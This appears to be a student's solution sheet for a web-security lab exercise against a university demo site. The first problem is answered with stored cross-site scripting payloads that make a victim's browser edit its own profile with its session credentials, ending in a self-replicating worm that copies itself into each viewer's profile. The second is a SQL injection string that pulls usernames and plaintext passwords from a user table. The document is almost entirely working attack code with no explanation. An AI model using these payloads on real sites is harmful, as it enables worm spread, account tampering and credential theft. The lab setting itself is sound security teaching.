# Problem 1

not_a_hacker<alert>You have been hacked!</alert>

```Javascript
<script>
document.body.style.backgroundColor = "blue"; ;
var form = new FormData();
form.append("description", "editted profile");
form.append("action", "edit");

var settings = {
  "url": "http://demo.sec.informatik.uni-stuttgart.de/hackspace/?",
  "method": "POST",
  "timeout": 0,
  "processData": false,
  "mimeType": "multipart/form-data",
  "contentType": false,
  "data": form
};

$.ajax(settings).done(function (response) {
  console.log(response);
});
</script>
```


```Javascript
<script>
document.body.style.backgroundColor = "pink";
var data = new FormData();
data.append("description", "edited profile from script");
data.append("action", "edit");

var xhr = new XMLHttpRequest();
xhr.withCredentials = true;

xhr.addEventListener("readystatechange", function() {
  if(this.readyState === 4) {
    console.log(this.responseText);
  }
});

xhr.open("POST", "http://demo.sec.informatik.uni-stuttgart.de/hackspace/?");
xhr.send(data);
</script>
```


```
<script>document.body.style.backgroundColor = "red";var data = new FormData();data.append("description", "edited profile from script");data.append("action", "edit");var xhr = new XMLHttpRequest();xhr.withCredentials = true; xhr.addEventListener("readystatechange", function() { if(this.readyState === 4) { console.log(this.responseText); }});xhr.open("POST", "http://demo.sec.informatik.uni-stuttgart.de/hackspace/?");xhr.send(data);</script>
```

```
<script>
var data = new FormData();
data.append("description", "<script>document.body.style.backgroundColor = \"red\";var data = new FormData();data.append(\"description\", \"edited profile from script\");data.append(\"action\", \"edit\");var xhr = new XMLHttpRequest();xhr.withCredentials = true; xhr.addEventListener(\"readystatechange\", function() { if(this.readyState === 4) { console.log(this.responseText); }});xhr.open(\"POST\", \"http://demo.sec.informatik.uni-stuttgart.de/hackspace/?\");xhr.send(data);</script>");
data.append("action", "edit");

var xhr = new XMLHttpRequest();
xhr.withCredentials = true;

xhr.addEventListener("readystatechange", function() {
  if(this.readyState === 4) {
    console.log(this.responseText);
  }
});

xhr.open("POST", "http://demo.sec.informatik.uni-stuttgart.de/hackspace/?");
xhr.send(data);
<script>
```



```Javascript
<script>
document.body.style.backgroundColor = "#7ec8e3";
var desc = document.getElementById("descriptiontext");

var data = new FormData();
data.append("description", desc.innerHTML);
data.append("action", "edit");
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.addEventListener("readystatechange", function() {
  if(this.readyState === 4) {
    console.log(this.responseText);
  }
});
xhr.open("POST", "http://demo.sec.informatik.uni-stuttgart.de/hackspace/?");
xhr.send(data);
</script>
```

# Problem 2
1. Solution:
' UNION ALL SELECT nick,password_plaintext  FROM community_users3; --
